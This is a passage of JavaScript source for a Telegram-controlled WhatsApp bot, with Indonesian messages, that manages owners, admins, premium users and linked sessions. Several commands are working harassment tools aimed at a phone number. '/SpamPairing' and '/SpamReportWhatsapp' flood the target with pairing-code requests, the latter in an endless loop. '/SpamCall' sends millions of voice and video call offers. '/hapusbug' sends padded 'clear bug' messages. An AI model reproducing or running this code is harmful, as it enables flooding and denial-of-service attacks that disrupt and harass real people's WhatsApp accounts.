        fileName = `video_${Date.now()}.mp4`;
    }

    try {
        
        const processingMsg = await bot.sendMessage(chatId, "⏳ Mengupload ke Catbox...");

        
        const fileLink = await bot.getFileLink(fileId);
        const response = await axios.get(fileLink, { responseType: 'stream' });

        
        const form = new FormData();
        form.append('reqtype', 'fileupload');
        form.append('fileToUpload', response.data, {
            filename: fileName,
            contentType: response.headers['content-type']
        });

        const { data: catboxUrl } = await axios.post('https://catbox.moe/user/api.php', form, {
            headers: form.getHeaders()
        });

        
        await bot.editMessageText(` Upload berhasil!\n📎 URL: ${catboxUrl}`, {
            chat_id: chatId,
            message_id: processingMsg.message_id
        });

    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, "❌ Gagal mengupload file ke Catbox");
    }
});

bot.onText(/\/SpamPairing (\d+)\s*(\d+)?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Kamu tidak punya izin untuk menjalankan perintah ini."
    );
  }

  const target = match[1];
  const count = parseInt(match[2]) || 999999;

  bot.sendMessage(
    chatId,
    `Mengirim Spam Pairing ${count} ke nomor ${target}...`
  );

  try {
    const { state } = await useMultiFileAuthState("senzypairing");
    const { version } = await fetchLatestBaileysVersion();

    const sucked = await makeWASocket({
      printQRInTerminal: false,
      mobile: false,
      auth: state,
      version,
      logger: pino({ level: "fatal" }),
      browser: ["Mac Os", "chrome", "121.0.6167.159"],
    });

    for (let i = 0; i < count; i++) {
      await sleep(1600);
      try {
        await sucked.requestPairingCode(target);
      } catch (e) {
        console.error(`Gagal spam pairing ke ${target}:`, e);
      }
    }

    bot.sendMessage(chatId, `Selesai spam pairing ke ${target}.`);
  } catch (err) {
    console.error("Error:", err);
    bot.sendMessage(chatId, "Terjadi error saat menjalankan spam pairing.");
  }
});

bot.onText(/\/SpamCall(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  // Check if the command is used in the allowed group

    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }
    
if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "🚫 Missing input. Please provide a target number. Example: /overload 62×××."
    );
  }

  const numberTarget = match[1].replace(/[^0-9]/g, "").replace(/^\+/, "");
  if (!/^\d+$/.test(numberTarget)) {
    return bot.sendMessage(
      chatId,
      "🚫 Invalid input. Example: /overload 62×××."
    );
  }

  const formatedNumber = numberTarget + "@s.whatsapp.net";

  await bot.sendPhoto(chatId, "https://files.catbox.moe/k8nmnc.jpg", {
    caption: `┏━━━━━━〣 𝙽𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 〣━━━━━━┓
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /spamcall
┃〢 Wᴀʀɴɪɴɢ : ᴜɴʟɪᴍɪᴛᴇᴅ ᴄᴀʟʟ
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`,
  });

  for (let i = 0; i < 9999999; i++) {
    await sendOfferCall(formatedNumber);
    await sendOfferVideoCall(formatedNumber);
    await new Promise((r) => setTimeout(r, 1000));
  }
});


bot.onText(/^\/hapusbug\s+(.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const q = match[1]; // Ambil argumen setelah /delete-bug
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

    if (!q) {
        return bot.sendMessage(chatId, `Cara Pakai Nih Njing!!!\n/fixedbug 62xxx`);
    }
    
    let pepec = q.replace(/[^0-9]/g, "");
    if (pepec.startsWith('0')) {
        return bot.sendMessage(chatId, `Contoh : /fixedbug 62xxx`);
    }
    
    let target = pepec + '@s.whatsapp.net';
    
    try {
        for (let i = 0; i < 3; i++) {
            await sock.sendMessage(target, { 
                text: "𝐂𝐈𝐊𝐈𝐃𝐀𝐖 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝐒𝐄𝐍𝐙𝐘 𝐆𝐀𝐍𝐓𝐄𝐍𝐆"
            });
        }
        bot.sendMessage(chatId, "Done Clear Bug By Senzy😜");l
    } catch (err) {
        console.error("Error:", err);
        bot.sendMessage(chatId, "Ada kesalahan saat mengirim bug.");
    }
});

bot.onText(/\/SpamReportWhatsapp (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (!isOwner(fromId)) {
    return bot.sendMessage(
      chatId,
      "❌ Kamu tidak punya izin untuk menjalankan perintah ini."
    );
  }

  const q = match[1];
  if (!q) {
    return bot.sendMessage(
      chatId,
      "❌ Mohon masukkan nomor yang ingin di-*report*.\nContoh: /spamreport 628xxxxxx"
    );
  }

  const target = q.replace(/[^0-9]/g, "").trim();
  const pepec = `${target}@s.whatsapp.net`;

  try {
    const { state } = await useMultiFileAuthState("senzyreport");
    const { version } = await fetchLatestBaileysVersion();

    const sucked = await makeWASocket({
      printQRInTerminal: false,
      mobile: false,
      auth: state,
      version,
      logger: pino({ level: "fatal" }),
      browser: ["Mac OS", "Chrome", "121.0.6167.159"],
    });

    await bot.sendMessage(chatId, `Telah Mereport Target ${pepec}`);

    while (true) {
      await sleep(1500);
      await sucked.requestPairingCode(target);
    }
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `done spam report ke nomor ${pepec} ,,tidak work all nomor ya!!`);
  }
});

//=======case owner=======//
bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 123456789.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 123456789.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});


bot.onText(/\/addowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const newOwnerId = match[1].trim();

  try {
    const configPath = "./config.js";
    const configContent = fs.readFileSync(configPath, "utf8");

    if (config.OWNER_ID.includes(newOwnerId)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`
╭─────────────────
│    GAGAL MENAMBAHKAN    
│────────────────
│ User ${newOwnerId} sudah
│ terdaftar sebagai owner
╰─────────────────\`\`\``,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID.push(newOwnerId);

    const newContent = `module.exports = {
  BOT_TOKEN: "${config.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
};`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `\`\`\`
╭─────────────────
│    BERHASIL MENAMBAHKAN    
│────────────────
│ ID: ${newOwnerId}
│ Status: Owner Bot
╰─────────────────\`\`\``,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error adding owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menambahkan owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/delowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const ownerIdToRemove = match[1].trim();

  try {
    const configPath = "./config.js";

    if (!config.OWNER_ID.includes(ownerIdToRemove)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`
╭─────────────────
│    GAGAL MENGHAPUS    
│────────────────
│ User ${ownerIdToRemove} tidak
│ terdaftar sebagai owner
╰─────────────────\`\`\``,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID = config.OWNER_ID.filter((id) => id !== ownerIdToRemove);

    const newContent = `module.exports = {
  BOT_TOKEN: "${config.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
};`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `\`\`\`
╭─────────────────
│    BERHASIL MENGHAPUS    
│────────────────
│ ID: ${ownerIdToRemove}
│ Status: User Biasa
╰─────────────────\`\`\``,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error removing owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menghapus owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/listbot/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender"
      );
    }

    let botList = 
  "```" + "\n" +
  "╭━━━⭓「 𝐋𝐢𝐒𝐓 ☇ °𝐁𝐎𝐓 」\n" +
  "║\n" +
  "┃\n";

let index = 1;

for (const [botNumber, sock] of sessions.entries()) {
  const status = sock.user ? "🟢" : "🔴";
  botList += `║ ◇ 𝐁𝐎𝐓 ${index} : ${botNumber}\n`;
  botList += `┃ ◇ 𝐒𝐓𝐀𝐓𝐔𝐒 : ${status}\n`;
  botList += "║\n";
  index++;
}
botList += `┃ ◇ 𝐓𝐎𝐓𝐀𝐋𝐒 : ${sessions.size}\n`;
botList += "╰━━━━━━━━━━━━━━━━━━⭓\n";
botList += "```";


    await bot.sendMessage(chatId, botList, { parse_mode: "Markdown" });
  } catch (error) {
    console.error("Error in listbot:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengambil daftar bot. Silakan coba lagi."
    );
  }
});

bot.onText(/\/addsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error(`bot ${botNum}:`, error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

const moment = require("moment");

bot.onText(/\/setcd (\d+[smh])/, (msg, match) => {
  const chatId = msg.chat.id;
  const response = setCooldown(match[1]);

  bot.sendMessage(chatId, response);
});

bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d."
    );
  }

  const args = match[1].split(" ");
  if (args.length < 2) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d."
    );
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ""));
  const duration = args[1];

  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d."
    );
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d."
    );
  }

  const now = moment();
  const expirationDate = moment().add(
    parseInt(duration),
    duration.slice(-1) === "d"
      ? "days"
      : duration.slice(-1) === "h"
      ? "hours"
      : "minutes"
  );

  if (!premiumUsers.find((user) => user.id === userId)) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(
      `${senderId} added ${userId} to premium until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}`
    );
    bot.sendMessage(
      chatId,
      `✅ User ${userId} has been added to the premium list until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  } else {
    const existingUser = premiumUsers.find((user) => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
    savePremiumUsers();
    bot.sendMessage(
      chatId,
      `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem 6843967527");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});


bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```L I S T - P R E M \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format("YYYY-MM-DD HH:mm:ss");
    message += `${index + 1}. ID: \`${
      user.id
    }\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/\/cekidch (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const link = match[1];

  let result = await getWhatsAppChannelInfo(link);

  if (result.error) {
    bot.sendMessage(chatId, `⚠️ ${result.error}`);
  } else {
    let teks = `
📢 *Informasi Channel WhatsApp*
🔹 *ID:* ${result.id}
🔹 *Nama:* ${result.name}
🔹 *Total Pengikut:* ${result.subscribers}
🔹 *Status:* ${result.status}
🔹 *Verified:* ${result.verified}
        `;
    bot.sendMessage(chatId, teks);
  }
});

bot.onText(/\/delbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  let statusMessage = await bot.sendMessage(
    chatId,
`
\`\`\`╭─────────────────
│    𝙼𝙴𝙽𝙶𝙷𝙰𝙿𝚄𝚂 𝙱𝙾𝚃    
│────────────────
│ Bot: ${botNumber}
│ Status: Memproses...
╰─────────────────\`\`\`
`,
    { parse_mode: "Markdown" }
  );

  try {
    const sock = sessions.get(botNumber);
    if (sock) {
      sock.logout();
      sessions.delete(botNumber);

      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }

      if (fs.existsSync(SESSIONS_FILE)) {
        const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        const updatedNumbers = activeNumbers.filter((num) => num !== botNumber);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
      }

      await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙱𝙾𝚃 𝙳𝙸𝙷𝙰𝙿𝚄𝚂   
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    } else {
      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });

        if (fs.existsSync(SESSIONS_FILE)) {
          const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
          const updatedNumbers = activeNumbers.filter(
            (num) => num !== botNumber
          );
          fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
        }

        await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙱𝙾𝚃 𝙳𝙸𝙷𝙰𝙿𝚄𝚂   
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      } else {
        await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙴𝚁𝚁𝙾𝚁    
│────────────────
│ Bot: ${botNumber}
│ Status: Bot tidak ditemukan!
╰─────────────────\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      }
    }
  } catch (error) {
    console.error("Error deleting bot:", error);
    await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙴𝚁𝚁𝙾𝚁  
│────────────────
│ Bot: ${botNumber}
│ Status: ${error.message}
╰─────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }
});


